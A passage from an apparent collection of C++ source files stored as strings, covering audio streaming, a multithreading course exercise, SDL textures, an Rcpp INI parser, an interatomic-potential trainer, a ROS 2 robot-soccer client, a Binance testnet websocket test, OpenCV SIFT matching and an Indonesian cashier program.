false;\n}\n\nint stream_v2::pa_audio_callback(\n        const void *input_buffer,\n        void *output_buffer,\n        unsigned long frames_per_buffer,\n        const PaStreamCallbackTimeInfo *time_info,\n        PaStreamCallbackFlags status_flags,\n        void *user_data) {\n    stream_v2 &instance = *(stream_v2 *)user_data;\n\n    auto *out       = (float *)output_buffer;\n    const float *in = (float *)input_buffer;\n\n    std::f",
    "// Exercise - Multi-Threading, Thread Class\n\n#include <iostream>\n#include <fstream>\n#include <functional>\n#include <string>\n#include <vector>\n#include <thread>\n#include \"ProcessData.h\"\n\nnamespace seneca\n{\n\t// The following function receives array (pointer) as the first argument, number of array \n\t//   elements (size) as second argument, divisor as the third argument, and avg as fourth argument. \n\t//   size and divisor are not necessarily same. When size and divisor hold same value, avg will \n\t//   hold average of the array elements. When they are different, avg will hold a value called \n\t// \t as average-factor. For part 1, you will be using same value for size and double. Use of \n\t//   different values for size and divisor will be useful for multi-threaded implementation in part-2.\n\tvoid computeAvgFactor(const int* arr, int size, int divisor, double& avg) {\n\t\tavg = 0;\n\t\tfor (int i = 0; i < size; i++)\n\t\t{\n\t\t\tavg += arr[i];\n\t\t}\n\t\tavg /= divisor;\n\t}\n\n\t// The following function receives array (pointer) as the first argument, number of array elements  \n\t//   (size) as second argument, divisor as the third argument, computed average value of the data items\n\t//   as fourth argument, and var as fifth argument. Size and divisor are not necessarily same as in the \n\t//   case of computeAvgFactor. When size and divisor hold same value, var will get total variance of \n\t//   the array elements. When they are different, var will hold a value called as variance factor. \n\t//   For part 1, you will be using same value for size and double. Use of different values for size \n\t//   and divisor will be useful for multi-threaded implementation in part-2.\n\tvoid computeVarFactor(const int* arr, int size, int divisor, double avg, double& var) {\n\t\tvar = 0;\n\t\tfor (int i = 0; i < size; i++)\n\t\t{\n\t\t\tvar += (arr[i] - avg) * (arr[i] - avg);\n\t\t}\n\t\tvar /= divisor;\n\t}\n\n\tProcessData::operator bool() const {\n\t\treturn total_items > 0 && data != nullptr && num_threads>0 && averages && variances && p_indices;\n\t}\n\n\t// The following constructor of the functor receives name of the data file, opens it in \n\t//   binary mode for reading, reads first int data as total_items, allocate memory space \n\t//   to hold the data items, and reads the data items into the allocated memory space. \n\t//   It prints first five data items and the last three data items as data samples.\n\tProcessData::ProcessData(const std::string& filename, int n_threads) {\n\t\t// TODO: Open the file whose name was received as parameter and read the content\n\t\t//         into variables \"total_items\" and \"data\". Don't forget to allocate\n\t\t//         memory for \"data\".\n\t\t//       The file is binary and has the format described in the specs.\n\n\n\n\n\t\tstd::cout << \"Item's count in file '\"<< filename << \"': \" << total_items << std::endl;\n\t\tstd::cout << \"  [\" << data[0] << \", \" << data[1] << \", \" << data[2] << \", ... , \"\n\t\t          << data[total_items - 3] << \", \" << data[total_items - 2] << \", \"\n\t\t          << data[total_items - 1] << \"]\\n\";\n\n\t\t// Following statements initialize the variables added for multi-threaded \n\t\t//   computation\n\t\tnum_threads = n_threads; \n\t\taverages = new double[num_threads] {};\n\t\tvariances = new double[num_threads] {};\n\t\tp_indices = new int[num_threads+1] {};\n\t\tfor (int i = 0; i < num_threads+1; i++)\n\t\t\tp_indices[i] = i * (total_items / num_threads);\n\t}\n\n\tProcessData::~ProcessData() {\n\t\tdelete[] data;\n\t\tdelete[] averages;\n\t\tdelete[] variances;\n\t\tdelete[] p_indices;\n\t}\n\n\t// TODO Implement operator(). For the computation of average and variance run the\n\t//   functions `computeAvgFactor` and `computeVarFactor` in multiple threads.\n\t// The function divides the data into a number of parts, where the number of parts is\n\t//   equal to the number of threads. Use multi-threading to compute average-factor for\n\t//   each part of the data by calling the function `computeAvgFactor`. Add the obtained\n\t//   average-factors to compute total average. Use the resulting total average as the\n\t//   average value argument for the function computeVarFactor, to compute variance-factors\n\t//   for each part of the data. Use multi-threading to compute variance-factor for each\n\t//   part of the data. Add computed variance-factors to obtain total variance.\n\t// Save the data into a file with filename held by the argument `target_file`.\n\t// Also, read the workshop instruction.\n\n\n\n\n}\n",
    "#include \"ResourceManager.h\"\n\n//Initializing static variable\nResourceManager* ResourceManager::mInstance = nullptr;\n\nResourceManager& ResourceManager::Instance() {\n    if (nullptr == mInstance) {\n        mInstance = new ResourceManager;\n    }\n    return *mInstance;\n}\n\nstd::shared_ptr<SDL_Texture> ResourceManager::LoadTexture(SDL_Renderer* renderer, std::string filepath) {\n    if (!mTextureResources.contains(filepath)) {\n        SDL_Surface* pixels = SDL_LoadBMP(filepath.c_str());\n        std::shared_ptr<SDL_Texture> texture = make_shared_texture(renderer, pixels);\n        mTextureResources.insert({ filepath, texture });\n        SDL_DestroySurface(pixels);\n    }\n    else {\n        /*SDL_Log(\"Reused resource %s\", filepath.c_str());*/\n    }\n    return mTextureResources[filepath];\n}\n\nstd::shared_ptr<SDL_Texture> make_shared_texture(SDL_Renderer* renderer, SDL_Surface* pixels) {\n    SDL_Texture* pTexture = SDL_CreateTextureFromSurface(renderer, pixels);\n\n    if (nullptr == pTexture) {\n        SDL_Log(\"Could not load texture from surface\");\n    }\n\n    return std::shared_ptr<SDL_Texture>(pTexture, TextureFunctorDeleter());\n}\n",
    "#include <cstdio>\n#include <cstdlib>\n#include <vector>\n#include <string>\n#include <iostream>\n#include <algorithm> // for std::isspace, std::remove_if\n#include <cctype>\n#include <Rcpp.h>\n\nusing namespace Rcpp;\n\n// Function to process a line and check if it should be included\nbool processLine(std::string &line)\n{\n  // Trim trailing whitespace\n  line.erase(std::find_if_not(line.rbegin(), line.rend(), [](unsigned char ch)\n  { return std::isspace(ch); })\n               .base(),\n  line.end());\n\n  // Trim leading whitespace\n  auto start = std::find_if_not(line.begin(), line.end(), [](unsigned char ch)\n  { return std::isspace(ch); });\n\n  // Line is empty or only whitespace\n  if (start == line.end())\n  {\n    return false;\n  }\n\n  // Check for ';' or '#'\n  return !(*start == ';' || *start == '#');\n}\n\n// [[Rcpp::export]]\nstd::vector<std::string> scan_ini_file(const std::string &filename)\n{\n  FILE *file = fopen(filename.c_str(), \"r\");\n  if (!file)\n  {\n    Rcpp::stop(\"Unable to find file: \" + filename);\n  }\n\n  std::vector<std::string> lines;\n  char buffer[256];\n  while (fgets(buffer, sizeof(buffer), file))\n  {\n    std::string line(buffer);\n    // Remove the newline character at the end, if it exists\n    if (!line.empty() && line.back() == '\\n')\n    {\n      line.erase(line.length() - 1);\n    }\n    // Process the line to check if it should be included\n    if (processLine(line))\n    {\n      lines.emplace_back(line);\n    }\n  }\n\n  fclose(file);\n  return lines;\n}\n\n// Helper function to trim leading and trailing whitespace characters from a string\nstd::string trim(const std::string &str)\n{\n  size_t start = 0;\n  size_t end = str.size();\n\n  // Find the first non-whitespace character\n  while (start < end && std::isspace(str[start]))\n  {\n    ++start;\n  }\n\n  // Find the last non-whitespace character\n  while (end > start && std::isspace(str[end - 1]))\n  {\n    --end;\n  }\n\n  return str.substr(start, end - start);\n}\n\n// Function to remove square brackets and all outer whitespaces\nstd::string removeBracketsAndTrim(const std::string &str)\n{\n  size_t start = 0;\n  size_t end = str.size();\n\n  // Skip leading whitespace\n  while (start < end && std::isspace(str[start]))\n  {\n    ++start;\n  }\n\n  // Skip trailing whitespace\n  while (end > start && std::isspace(str[end - 1]))\n  {\n    --end;\n  }\n\n  // Remove square brackets if present\n  if (start < end && str[start] == '[')\n  {\n    ++start;\n  }\n  if (end > start && str[end - 1] == ']')\n  {\n    --end;\n  }\n\n  // Trim the internal whitespace again\n  return trim(str.substr(start, end - start));\n}\n\n// [[Rcpp::export]]\nstd::vector<std::string> process_profile_name(const std::vector<std::string> &vec)\n{\n  std::vector<std::string> modifiedVec;\n  modifiedVec.reserve(vec.size());\n\n  for (const auto &str : vec)\n  {\n    std::string modified = removeBracketsAndTrim(str);\n    modifiedVec.push_back(modified);\n  }\n\n  return modifiedVec;\n}\n",
    "/*   This software is called MLIP for Machine Learning Interatomic Potentials.\n *   MLIP can only be used for non-commercial research and cannot be re-distributed.\n *   The use of MLIP must be acknowledged by citing approriate references.\n *   See the LICENSE file for details.\n */\n\n#ifdef MLIP_MPI\n#\tinclude <mpi.h>\n#endif\n\n#include \"mtpr_trainer.h\"\n\n#ifdef ALGLIB\n#\tinclude \"alglib/optimization.h\"\n#endif\n\n#include <sstream>\n\nusing namespace std;\n\n\nvoid MTPR_trainer::shift(bool shift_)\n{\np_mlmtpr->shift_ = shift_;\n\n}\n\n\nvoid MTPR_trainer::LoadWeights(ifstream& ifs)\n{\n\n\tstring next;\n\n\n\tifs >> wgt_eqtn_forces;\n\t//cout << \"forces coeffitient = \" << wgt_eqtn_forces << \"\\n\";\n\tifs >> next;\n\tifs >> next;\n\n\tifs >> wgt_eqtn_stress;\n\t//cout << \"stress coeffitient = \" << wgt_eqtn_stress << \"\\n\";\n\tifs >> next;\n\tifs >> next;\n\n\tifs >> wgt_eqtn_constr;\n\t//cout << \"stress coeffitient = \" << wgt_eqtn_stress << \"\\n\";\n\tifs >> next;\n\tifs >> next;\n\n}\n\n\n\nvoid MTPR_trainer::ClearSLAE()\n{\n\n\tint n = p_mlmtpr->alpha_count - 1 + p_mlmtpr->species_count;\t// Matrix size\n\n\tquad_opt_vec = new double[n];\n\tquad_opt_matr = new double[n*n];\n\n\tquad_opt_eqn_count = 0;\n\tquad_opt_scalar = 0.0;\n\n\tmemset(quad_opt_vec, 0, n * sizeof(double));\n\tmemset(quad_opt_matr, 0, n * n * sizeof(double));\n}\n\nvoid MTPR_trainer::SymmetrizeSLAE()\n{\n\tint n = p_mlmtpr->alpha_count + p_mlmtpr->species_count - 1;\t\t// Matrix size\n\n\tfor (int i = 0; i < n; i++)\n\t\tfor (int j = i + 1; j < n; j++)\n\t\t\tquad_opt_matr[j*n + i] = quad_opt_matr[i*n + j];\n}\n\nvoid MTPR_trainer::SolveSLAE()\n{\n\n\tSymmetrizeSLAE();\n\n\tdouble gammareg = 1e-13;\n\n\tint n = p_mlmtpr->alpha_count - 1 + p_mlmtpr->species_count;\t\t// Matrix size\n\n\tfor (int i = 0; i < n; i++)\n\t\tquad_opt_matr[i*n + i] += gammareg*(1 + quad_opt_matr[i*n + i]);\n\n\t// Gaussian Elimination\n\tfor (int i = 0; i < (n - 1); i++) {\n\t\tfor (int j = (i + 1); j < n; j++) {\n\t\t\tdouble ratio = quad_opt_matr[j*n + i] / quad_opt_matr[i*n + i];\n\t\t\tfor (int count = i; count < n; count++) {\n\t\t\t\tquad_opt_matr[j*n + count] -= (ratio * quad_opt_matr[i*n + count]);\n\t\t\t}\n\t\t\tquad_opt_vec[j] -= (ratio * quad_opt_vec[i]);\n\t\t}\n\t}\n\n\n\tp_mlmtpr->linear_coeffs = p_mlmtpr->LinCoeff();\t/// TO MOVE TO MLMTPR\n\n\tp_mlmtpr->linear_coeffs[n - 1] = quad_opt_vec[n - 1] / quad_opt_matr[(n - 1)*n + (n - 1)];\n\n\tfor (int i = (n - 2); i >= 0; i--) {\n\t\tdouble temp = quad_opt_vec[i];\n\t\tfor (int j = (i + 1); j < n; j++) {\n\t\t\ttemp -= (quad_opt_matr[i*n + j] * p_mlmtpr->linear_coeffs[j]);\n\t\t}\n\t\tp_mlmtpr->linear_coeffs[i] = temp / quad_opt_matr[i*n + i];\n\t}\n\t//double e0_ = 0;\n\t//for (int i = 0; i < p_mlmtpr->species_count; i++)\n\t//{\n\t//\te0_ += p_mlmtpr->regression_coeffs[i] / p_mlmtpr->species_count;\n\t//}\n\n//\tdouble e_0 = 0;\n//\tfor (int i = 0; i < p_mlmtpr->species_count; i++) {\n//\t\te_0 += p_mlmtpr->linear_coeffs[i] / p_mlmtpr->species_count;\n//\t}\n//\tstd::random_device rand_device;\n//\tstd::default_random_engine generator(rand_device());\n//\tstd::uniform_real_distribution<> uniform(-0.05, 0.05);\n\tfor (int i = 0; i < p_mlmtpr->species_count; i++) {\n\t\tp_mlmtpr->regression_coeffs[i] = p_mlmtpr->linear_coeffs[i] - 1.0;\n\t\tp_mlmtpr->linear_coeffs[i] = 1.0;\n\t}\n\tfor (int i = 0; i < n; i++) {\n\t\tp_mlmtpr->regression_coeffs[p_mlmtpr->regression_coeffs.size() - n + i] = p_mlmtpr->linear_coeffs[i];\n\t}\n\tfor (int i = (int)p_mlmtpr->regression_coeffs.size() - n + p_mlmtpr->species_count; i < (int)p_mlmtpr->regression_coeffs.size(); i++)\n\t\tp_mlmtpr->regression_coeffs[i] /= p_mlmtpr->linear_mults[i - (p_mlmtpr->regression_coeffs.size() - n + p_mlmtpr->species_count)] * 1.0;\n\n\n}\n\n\nvoid MTPR_trainer::AddToSLAE(Configuration& cfg, double weight)\n{\n\tif (cfg.size() == 0)\t\t\t\t// \n\t\treturn;\n\n\tint n = p_mlmtpr->alpha_count - 1 + p_mlmtpr->species_count;\t\t// Matrix size\n      //  {std::cout<<n<<\" \"<<std::endl;}\n     //   {std::cout<<n<<\" \"<<  (int)p_mlmtpr->energy_cmpnts.size() <<std::endl;}\n\tp_mlmtpr->CalcEFSComponents(cfg);\n//        int w=p_mlmtpr->energy_cmpnts.size();\n      //  {std::cout<<n<<\" \"<<std::endl;}\n\tdouble wgt_energy = wgt_eqtn_energy / cfg.size();\n\tdouble wgt_forces = wgt_eqtn_forces;\n\tdouble wgt_stress = wgt_eqtn_stress / cfg.size();\n\n\tif (weighting == \"structures\")\n\t{\n\t\twgt_energy /= cfg.size();\n\t\twgt_stress /= cfg.size();\n\n\t\twgt_forces /= cfg.size();\n\t}\n\telse if (weighting == \"molecules\")\n\t{\n\t\twgt_energy *= cfg.size();\n\t\twgt_stress *= cfg.size();\n\t}\n\n\tcout.precision(15);\n\n\tint fn = norm_by_forces;\n\tdouble d = 0.1;\n\tdouble avef = 0;\n\n\tif (cfg.has_forces())\n\t\tfor (int ind = 0; ind < cfg.size(); ind++)\n\t\t\tavef += cfg.force(ind).NormSq() / cfg.size();\n\n\n\tif (cfg.has_energy())\n\t{\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tfor (int j = i; j < n; j++)\n\t\t\t\tquad_opt_matr[i*n + j] += weight * wgt_energy * p_mlmtpr->energy_cmpnts[i] * p_mlmtpr->energy_cmpnts[j] * d / (d + fn*avef);\n\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tquad_opt_vec[i] += weight * wgt_energy * p_mlmtpr->energy_cmpnts[i] * cfg.energy*d / (d + fn*avef);\n\n\t\tquad_opt_scalar += weight * wgt_energy * cfg.energy * cfg.energy *d / (d + fn*avef);\n\n\t\tquad_opt_eqn_coun",
    "// Copyright 2024 A Team\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n// all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n// THE SOFTWARE.\n\n#include <string>\n#include <rclcpp/rclcpp.hpp>\n#include <rclcpp_components/register_node_macro.hpp>\n#include \"core/protobuf_logging.hpp\"\n#include <ssl_ros_bridge_msgs/srv/set_desired_keeper.hpp>\n#include <ssl_ros_bridge_msgs/srv/substitute_bot.hpp>\n#include <ssl_ros_bridge_msgs/srv/reconnect_team_client.hpp>\n#include <ssl_ros_bridge_msgs/srv/set_team_advantage_choice.hpp>\n#include <ssl_ros_bridge_msgs/msg/team_client_connection_status.hpp>\n#include \"team_client.hpp\"\n\nnamespace ssl_ros_bridge::game_controller_bridge\n{\nclass TeamClientNode : public rclcpp::Node\n{\npublic:\n  explicit TeamClientNode(const rclcpp::NodeOptions & options)\n  : rclcpp::Node(\"team_client_node\", options),\n    team_client_(get_logger().get_child(\"team_client\"))\n  {\n    SET_ROS_PROTOBUF_LOG_HANDLER(\"team_client_node.protobuf\");\n\n    declare_parameter<std::string>(\"gc_ip_address\", \"\");\n    declare_parameter<uint16_t>(\"gc_port\", 10008);\n    declare_parameter<std::string>(\"team_name\", \"Test Team\");\n    declare_parameter<std::string>(\"team_color\", \"auto\");\n\n    set_desired_keeper_service_ = create_service<ssl_ros_bridge_msgs::srv::SetDesiredKeeper>(\n      \"~/set_desired_keeper\",\n      std::bind(\n        &TeamClientNode::HandleSetDesiredKeeper, this, std::placeholders::_1,\n        std::placeholders::_2), rclcpp::ServicesQoS());\n\n    substitute_bot_service_ = create_service<ssl_ros_bridge_msgs::srv::SubstituteBot>(\n      \"~/substitute_bot\",\n      std::bind(\n        &TeamClientNode::HandleSubstituteBot, this, std::placeholders::_1,\n        std::placeholders::_2), rclcpp::ServicesQoS());\n\n    reconnect_service_ = create_service<ssl_ros_bridge_msgs::srv::ReconnectTeamClient>(\n      \"~/reconnect\",\n      std::bind(\n        &TeamClientNode::HandleReconnectTeamClient, this, std::placeholders::_1,\n        std::placeholders::_2), rclcpp::ServicesQoS());\n\n    advantage_choice_service_ = create_service<ssl_ros_bridge_msgs::srv::SetTeamAdvantageChoice>(\n      \"~/set_advantage_choice\",\n      std::bind(\n        &TeamClientNode::HandleSetAdvantageChoice, this, std::placeholders::_1,\n        std::placeholders::_2), rclcpp::ServicesQoS());\n\n    connection_status_publisher_ =\n      create_publisher<ssl_ros_bridge_msgs::msg::TeamClientConnectionStatus>(\n      \"~/connection_status\", rclcpp::ServicesQoS());\n\n    const auto ping_period = declare_parameter<double>(\"ping_period\", 5);\n    ping_timer_ =\n      create_wall_timer(\n      std::chrono::duration<double>(ping_period),\n      std::bind(&TeamClientNode::PingCallback, this));\n\n    if (!Connect()) {\n      RCLCPP_ERROR(get_logger(), \"Failed to connect to Game Controller.\");\n    }\n  }\n\nprivate:\n  TeamClient team_client_;\n  rclcpp::Service<ssl_ros_bridge_msgs::srv::SetDesiredKeeper>::SharedPtr\n    set_desired_keeper_service_;\n  rclcpp::Service<ssl_ros_bridge_msgs::srv::SubstituteBot>::SharedPtr substitute_bot_service_;\n  rclcpp::Service<ssl_ros_bridge_msgs::srv::ReconnectTeamClient>::SharedPtr reconnect_service_;\n  rclcpp::Service<ssl_ros_bridge_msgs::srv::SetTeamAdvantageChoice>::SharedPtr\n    advantage_choice_service_;\n  rclcpp::Publisher<ssl_ros_bridge_msgs::msg::TeamClientConnectionStatus>::SharedPtr\n    connection_status_publisher_;\n  rclcpp::TimerBase::SharedPtr ping_timer_;\n\n  bool Connect()\n  {\n    const auto address_string = get_parameter(\"gc_ip_address\").as_string();\n    if(address_string.empty()) {\n      RCLCPP_WARN(get_logger(), \"Address parameter empty. Cannot attempt to connect.\");\n      // Returning \"success\" because this isn't a problem during setup.\n      return true;\n    }\n    TeamClient::ConnectionParameters connection_parameters;\n    connection_parameters.address = boost::asio::ip::address::from_string(address_string);\n    connection_parameters.port = get_parameter(\"gc_port\").as_int();\n    connection_parameters.team_name = get_parameter(\"team_name\").as_string();\n    const auto team_color_name = get_parameter(\"team_colo",
    "#include \"lockws.hpp\"\n#include <thread>\n#include \"network_interface_handler.hpp\"\n\nnet_interface_handler handle;\n\nlock_client second;\nlock_client third;\nin_addr interface_address;\n\nvoid second_thread() {\n   std::cout<<\"Thread 2\"<<std::endl;\n   if(third.connect(\"wss://testnet.binance.vision:443\", \"/ws-api/v3\", &(handle.interface_array[1].ip_addr), handle.interface_array[1].name))\n      std::cout<<third.get_error_message()<<std::endl;\n   for(int i=0; i<10; i++)\n      third.send(R\"({\"id\":-1,\"method\":\"time\"})\");\n   for(int i=0; i<10; i++)\n      third.basic_read();\n}\n\nint main(){\n\n   handle.get_network_interfaces();\n\n   if(second.connect(\"wss://testnet.binance.vision:443\", \"/ws-api/v3\", &(handle.interface_array[0].ip_addr), handle.interface_array[0].name))\n      std::cout<<second.get_error_message()<<std::endl;\n   std::cout<<\"Thread 1\"<<std::endl;\n   for(int i=0; i<10; i++)\n      second.send(R\"({\"id\":-1,\"method\":\"time\"})\");\n   for(int i=0; i<10; i++)\n      second.basic_read();\n   \n   std::thread t1(second_thread);\n\n   t1.join();\n   std::cout<<\"Thread 1\"<<std::endl;\n   second.send(R\"({\"id\":-1,\"method\":\"time\"})\");\n   second.basic_read();\n\n}\n",
    "#include <opencv2/opencv.hpp>\n#include <opencv2/xfeatures2d.hpp>\n#include <iostream>\n#include <filesystem>\n#include <fstream>\n#include <iomanip>\n#include <algorithm>\n\nusing namespace cv;\nusing namespace cv::xfeatures2d;\nusing namespace std;\nnamespace fs = std::filesystem;\n\n// \u8bfb\u53d6\u5e76\u663e\u793a\u56fe\u50cf\nvoid readAndShowImage(const string& imagePath, Mat& image, const string& windowName, int x, int y) {\n    image = imread(imagePath, IMREAD_GRAYSCALE);\n    if (image.empty()) {\n        cout << \"\u65e0\u6cd5\u6253\u5f00\u6216\u627e\u5230\u56fe\u50cf: \" << imagePath << endl;\n        return;\n    }\n    namedWindow(windowName, WINDOW_AUTOSIZE);\n    moveWindow(windowName, x, y);\n    imshow(windowName, image);\n}\n\n// \u68c0\u6d4b\u5e76\u7ed8\u5236\u5173\u952e\u70b9\nvoid detectAndDrawKeypoints(const Mat& image, vector<KeyPoint>& keypoints, Mat& outputImage, const string& windowName, int x, int y, double edgeThreshold) {\n    // \u4f7f\u7528\u9ed8\u8ba4\u53c2\u6570\uff0c\u4fee\u6539 edgeThreshold\n    Ptr<SIFT> detector = SIFT::create(0, 3, 0.04, edgeThreshold, 1.6);\n    detector->detect(image, keypoints);\n    drawKeypoints(image, keypoints, outputImage, Scalar::all(-1), DrawMatchesFlags::DRAW_RICH_KEYPOINTS);\n    namedWindow(windowName, WINDOW_AUTOSIZE);\n    moveWindow(windowName, x, y);\n    imshow(windowName, outputImage);\n}\n\n// \u8ba1\u7b97\u63cf\u8ff0\u7b26\nvoid computeDescriptors(const Mat& image, vector<KeyPoint>& keypoints, Mat& descriptors, double edgeThreshold) {\n    // \u4f7f\u7528\u9ed8\u8ba4\u53c2\u6570\uff0c\u4fee\u6539 edgeThreshold\n    Ptr<SIFT> extractor = SIFT::create(0, 3, 0.04, edgeThreshold, 1.6);\n    extractor->compute(image, keypoints, descriptors);\n}\n\n// \u5339\u914d\u63cf\u8ff0\u7b26\nvoid matchDescriptors(const Mat& descriptors1, const Mat& descriptors2, vector<DMatch>& matches) {\n    BFMatcher matcher(NORM_L2, true);\n    matcher.match(descriptors1, descriptors2, matches);\n}\n\n// \u8fc7\u6ee4\u5339\u914d\u7ed3\u679c\u5e76\u8ba1\u7b97\u5339\u914d\u51c6\u786e\u7387\nvoid filterMatches(const vector<KeyPoint>& keypoints1, const vector<KeyPoint>& keypoints2, const vector<DMatch>& matches, vector<DMatch>& goodMatches, float& matchAccuracy) {\n    vector<Point2f> points1, points2;\n    for (const auto& match : matches) {\n        points1.push_back(keypoints1[match.queryIdx].pt);\n        points2.push_back(keypoints2[match.trainIdx].pt);\n    }\n\n    vector<uchar> inliersMask(points1.size());\n    Mat H = findHomography(points1, points2, RANSAC, 3, inliersMask);\n\n    goodMatches.clear();\n    for (size_t i = 0; i < matches.size(); ++i) {\n        if (inliersMask[i]) {\n            goodMatches.push_back(matches[i]);\n        }\n    }\n\n    if (matches.size() > 0) {\n        matchAccuracy = static_cast<float>(goodMatches.size()) / matches.size();\n    } else {\n        matchAccuracy = 0.0f;\n    }\n}\n\n// \u7ed8\u5236\u5e76\u663e\u793a\u5339\u914d\u7ed3\u679c\nvoid drawMatchesAndShow(const Mat& img1, const vector<KeyPoint>& keypoints1, const Mat& img2, const vector<KeyPoint>& keypoints2, const vector<DMatch>& matches, const string& windowName, int x, int y, const string& outputPath) {\n    Mat imgMatches;\n    drawMatches(img1, keypoints1, img2, keypoints2, matches, imgMatches);\n    namedWindow(windowName, WINDOW_AUTOSIZE);\n    moveWindow(windowName, x, y);\n    imshow(windowName, imgMatches);\n    imwrite(outputPath, imgMatches);\n}\n\n// \u5904\u7406\u6587\u4ef6\u5939\u4e2d\u7684\u56fe\u50cf\nvoid processImagesInFolder(const string& inputFolderPath, const string& outputFolderPath, bool onlyKeypoints, ofstream& csvFileKeypoints, ofstream& csvFileMatches, const string& folderName) {\n    vector<string> imageFiles;\n    for (const auto& entry : fs::directory_iterator(inputFolderPath)) {\n        if (entry.is_regular_file()) {\n            string extension = entry.path().extension().string();\n            if (extension == \".ppm\" || extension == \".png\" || extension == \".pgm\") {\n                imageFiles.push_back(entry.path().string());\n            }\n        }\n    }\n    if (imageFiles.empty()) {\n        cout << \"\u6587\u4ef6\u5939\u4e2d\u6ca1\u6709\u8db3\u591f\u7684\u56fe\u50cf\u3002\" << endl;\n        return;\n    }\n    if (!fs::exists(outputFolderPath)) {\n        fs::create_directories(outputFolderPath);\n    }\n\n    // \u51c6\u5907\u4e3b\u66f2\u7387\u6bd4\u503c\u5217\u8868\n    vector<int> edgeThresholds;\n    for (int i = 5; i <= 15; ++i) {\n        edgeThresholds.push_back(i);\n    }\n\n    vector<vector<vector<KeyPoint>>> allKeypoints(imageFiles.size(), vector<vector<KeyPoint>>(edgeThresholds.size()));\n    for (size_t i = 0; i < imageFiles.size(); ++i) {\n        csvFileKeypoints << folderName + \"/image\" + to_string(i + 1);\n        for (size_t e = 0; e < edgeThresholds.size(); ++e) {\n            double edgeThreshold = edgeThresholds[e];\n            Mat src;\n            readAndShowImage(imageFiles[i], src, \"src\", 10, 20);\n            vector<KeyPoint> keypoints;\n            Mat drawsrc;\n            detectAndDrawKeypoints(src, keypoints, drawsrc, \"drawsrc\", 10, 20, edgeThreshold);\n\n            csvFileKeypoints << \",\" << keypoints.size();\n            allKeypoints[i][e] = keypoints;\n        }\n        csvFileKeypoints << endl;\n    }\n\n    if (!onlyKeypoints) {\n        for (size_t i = 0; i < imageFiles.size(); ++i) {\n            for (size_t j = i + 1; j < imageFiles.size(); ++j) {\n                string pairName = folderName + \"/results\" + to_string(i + 1) + \"_\" + to_string(j + 1);\n                csvFileMatches << pairName;\n\n                for (size_t e =",
    "//orang ke 1\n#include <iostream>\n#include <iomanip>\nusing namespace std;\n\nint main () {\n  //orang ke 2\n   cout<<\"##   Program Aplikasi Kasir  ##\"<<endl;\n    cout<<\"===============================\"<<endl<<endl;\n\n    const int MAX_BARANG = 10;\n    string namaBarang [MAX_BARANG];\n    long hargaBarang [MAX_BARANG];\n    int jumlahBArang [MAX_BARANG];\n    long jumlahTotalBarang;\n    long totalHarga = 0;\n    long jumlahBayar = 0;\n\n    cout<<\"##   Selamat Datang di Mini Market ILKOOM    ##\"<<endl<<endl;\n\n    cout<<\"Masukan jumlah barangan yangan ingin dibeli : \"; cin>>jumlahTotalBarang; cout<<endl;\n    \n    if (jumlahTotalBarang <= 0 || jumlahTotalBarang > MAX_BARANG){\n        cout<<\"Jumlah barang tidak valid\"<<endl;\n        return 0;\n    }\n    for (int i=0; i<jumlahTotalBarang; i++){\n        cout<<\"Barang ke : \"<<i+1<<endl;\n        cout<<\"Nama Barang : \";\n        getline(cin>>ws,namaBarang[i]);\n        cout<<\"Harga Satuan : \"; cin>>hargaBarang[i];\n        cout<<\"Jumlah : \"<<namaBarang[i]<<\" yang dibeli : \"; cin>>jumlahBArang[i]; \n        cout<<endl;\n    }cout<<endl;\n  cout<<\"------------------------------------------------------\"<<endl;\n    cout<<\"####----      Struk Mini Market ILKOOM        ----####\"<<endl;\n    cout<<\"------------------------------------------------------\"<<endl;\n    cout<<\"NO   Barang  Jumlah  Harga Satuan    Sub Total\"<<endl;\n    for(int i = 0; i < jumlahTotalBarang; i++){\n        cout<<setw(1)<<1+1<<\" \";\n        cout<<left<<setw(12)<<namaBarang[i];\n        cout<<right<<setw(15)<<jumlahBArang[i];\n        cout<<setw(18)<<hargaBarang[i];\n        cout<<setw(15)<<jumlahBArang[i]*hargaBarang[i];\n        cout<<endl;\n        totalHarga=totalHarga+(jumlahBArang[i]*hargaBarang[i]);\n    }\n    cout<<\"------------------------------------------------------\"<<endl;\n    cout<<\"Total Harga : Rp. \"<<totalHarga<<endl<<endl;\n    cout<<\"Jumlah Bayar : Rp. \"; cin>>jumlahBayar; cout<<endl;\n    \n    while(jumlahBayar-totalHarga<0){\n        cout<<\"Maaf, Uang anda kurang. Mohon lakukan ulang pembayaran\"<<endl;\n        cout<<\"Jumlah Bayar : Rp. \"; cin>>jumlahBayar; cout<<endl;\n    }\n    cout<<\"Kembalian : Rp. \"<<jumlahBayar-totalHarga<<endl<<endl;\n    cout<<\"------------------------------------------------------\"<<endl;\n    cout<<\"#### Terimakasih sudah berbelanja, datang kembali ####\"<<endl;\n    cout<<\"------------------------------------------------------\"<<endl;\n    \n    return 0;\n}\n",
